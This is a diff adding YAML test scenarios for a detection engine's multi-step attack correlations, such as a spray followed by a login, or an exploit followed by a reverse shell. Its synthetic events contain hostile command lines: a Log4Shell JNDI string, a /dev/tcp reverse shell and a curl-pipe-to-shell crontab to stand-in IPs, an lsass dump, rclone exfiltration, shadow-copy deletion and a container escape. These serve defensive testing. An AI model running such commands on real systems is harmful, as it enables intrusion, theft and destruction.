@@ -1,0 +1,104 @@
+# Multi-step campaigns. `at` is minutes from the first step. Each step is run through detection;
+# correlations are evaluated on every step against the earlier ones. A chain passes when the
+# expected correlation fires on the final step.
+scenarios:
+- id: CHN-001
+  name: Spray, then successful login from same IP
+  expect_correlation: TB-COR-001
+  events:
+    - {at: 0, title: Spray, event_type: authentication.password_spraying, source_ip: 203.0.113.9, asset_name: vpn-01}
+    - {at: 18, title: Login, event_type: authentication.brute_force_success, source_ip: 203.0.113.9, asset_name: vpn-01, username: svc-vpn}
+- id: CHN-002
+  name: Scan, then SQL injection from same source
+  expect_correlation: TB-COR-002
+  events:
+    - {at: 0, title: HTTP request, event_type: web.request, source_ip: 198.51.100.4, raw_data: {user_agent: "Mozilla/5.0 zgrab/0.x", url: /}}
+    - {at: 25, title: HTTP request, event_type: web.request, source_ip: 198.51.100.4, raw_data: {url: "/item?id=1' OR '1'='1"}}
+- id: CHN-003
+  name: Exploit, then reverse shell on same host
+  expect_correlation: TB-COR-003
+  events:
+    - {at: 0, title: HTTP request, event_type: web.request, source_ip: 198.51.100.8, asset_name: web-03, raw_data: {user_agent: "${jndi:ldap://203.0.113.5:1389/x}"}}
+    - {at: 3, title: Process creation, event_type: process.start, asset_name: web-03, command_line: "bash -c 'bash -i >& /dev/tcp/203.0.113.5/4444 0>&1'"}
+- id: CHN-004
+  name: Credential dump, then PsExec by the same account
+  expect_correlation: TB-COR-004
+  events:
+    - {at: 0, title: Process creation, event_type: process.start, username: svc-backup, asset_name: srv-a, process_name: procdump64.exe, command_line: "procdump64.exe -ma lsass.exe l.dmp"}
+    - {at: 40, title: Process creation, event_type: process.start, username: svc-backup, asset_name: srv-b, process_name: PsExec64.exe, command_line: "PsExec64.exe \\\\10.0.0.9 -s cmd.exe"}
+- id: CHN-005
+  name: Staging archive, then upload with rclone
+  expect_correlation: TB-COR-005
+  events:
+    - {at: 0, title: Process creation, event_type: process.start, asset_name: fin-ws-1, command_line: "tar czf /tmp/docs.tgz /home/alice/documents /home/alice/desktop"}
+    - {at: 70, title: Process creation, event_type: process.start, asset_name: fin-ws-1, command_line: "rclone copy /tmp/docs.tgz remote:stash"}
+- id: CHN-006
+  name: Defender disabled, then shadow copies deleted
+  expect_correlation: TB-COR-006
+  events:
+    - {at: 0, title: Process creation, event_type: process.start, asset_name: srv-fs-1, command_line: "powershell Set-MpPreference -DisableRealtimeMonitoring $true"}
+    - {at: 9, title: Process creation, event_type: process.start, asset_name: srv-fs-1, command_line: "vssadmin delete shadows /all /quiet"}
+- id: CHN-007
+  name: Phishing attachment, then macro-spawned PowerShell for the same user
+  expect_correlation: TB-COR-008
+  events:
+    - {at: 0, title: Email delivered, event_type: email.delivered, username: carol, raw_data: {attachment: "Invoice.pdf.exe"}}
+    - {at: 30, title: Process creation, event_type: process.start, username: carol, process_name: powershell.exe, command_line: "powershell -nop -w hidden", raw_data: {parent_process: WINWORD.EXE}}
+- id: CHN-008
+  name: Privilege grant, then CloudTrail disabled by the same principal
+  expect_correlation: TB-COR-009
+  events:
+    - {at: 0, title: CloudTrail event, event_type: cloud.audit, username: ci-bot, raw_data: {eventName: AttachUserPolicy, requestParameters: {policyArn: "arn:aws:iam::aws:policy/AdministratorAccess"}}}
+    - {at: 6, title: CloudTrail event, event_type: cloud.audit, username: ci-bot, raw_data: {eventName: StopLogging}}
+- id: CHN-009
+  name: Web shell then persistence
+  expect_correlation: TB-COR-010
+  events:
+    - {at: 0, title: File created, event_type: file.create, asset_name: web-01, process_name: bash, raw_data: {file_path: "/var/www/html/up/x.php"}}
+    - {at: 20, title: Process creation, event_type: process.start, asset_name: web-01, command_line: "bash -c '(crontab -l; echo \"*/5 * * * * curl -s http://203.0.113.5/a|sh\") | crontab -'"}
+- id: CHN-010
+  name: Container shell then privileged container
+  expect_correlation: TB-COR-011
+  events:
+    - {at: 0, title: Falco alert, event_type: container.runtime_alert, asset_name: k8s-node-4, raw_data: {priority: Critical, rule: "Terminal shell in container"}}
+    - {at: 12, title: Process creation, event_type: process.start, asset_name: k8s-node-4, command_line: "docker run --privileged -v /:/host alpine chroot /host sh"}
+- id: CHN-011
+  name: Ransomware precursors
+  expect_correlation: TB-COR-012
+  events:
+    - {at: 0, title: Process creation, event_type: process.start, asset_name: srv-db-2, command_line: "net stop \"SQL Server (MSSQLSERVER)\" /y"}
+    - {at: 7, title: Process creation, event_type: process.start, asset_name: srv-db-2, command_line: "vssadmin delete shadows /all /quiet"}
+- id: CHN-012
+  name: Three tactics on one host
+  expect_correlation: TB-COR-007
+  events:
+    - {at: 0, title: Process creation, event_type: process.start, asset_name: app-9, command_line: "curl -s http://203.0.113.50/x.sh | bash"}
+    - {at: 15, title: Process creation, event_type: process.start, asset_name: app-9, command_line: "useradd -m -s /bin/bash helpdesk2"}
+    - {at: 30, title: Process creation, event_type: process.start, asset_name: app-9, command_line: "cat /etc/shadow"}
+- id: CHN-013
+  name: Twelve failed logins in under ten minutes from one source
+  expect_correlation: TB-COR-013
+  events:
+    - {at: 0, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 1, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 2, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 3, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 4, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 5, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 6, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 7, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 8, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 9, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 10, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+    - {at: 11, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.70}
+- id: CHN-014
+  name: Failed logins against seven different accounts from one source
+  expect_correlation: TB-COR-014
+  events:
+    - {at: 0, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.71, username: user0}
+    - {at: 1, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.71, username: user1}
+    - {at: 2, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.71, username: user2}
+    - {at: 3, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.71, username: user3}
+    - {at: 4, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.71, username: user4}
+    - {at: 5, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.71, username: user5}
+    - {at: 6, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.71, username: user6}
